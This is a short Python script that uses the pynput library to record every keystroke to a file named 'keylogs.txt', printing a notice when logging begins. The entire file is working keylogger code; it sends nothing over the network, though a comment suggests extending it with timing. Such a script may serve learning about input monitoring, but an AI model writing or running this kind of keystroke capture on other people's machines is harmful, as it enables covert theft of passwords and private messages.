from pynput import keyboard

def onPress(k):
	with open('keylogs.txt', 'a+') as klogs:
		klogs.write(str(k))

def klogcaller():
	# we can use time library to control how much time it should log or print the time keys were pressed.
	print ("Keylogging started: Take a look at the file 'keylogs.txt' in the current working directory")
	with keyboard.Listener(on_press=onPress) as l1st3n3r:
		l1st3n3r.join()

	klogcaller.__code__ = (lambda:None).__code__

klogcaller()
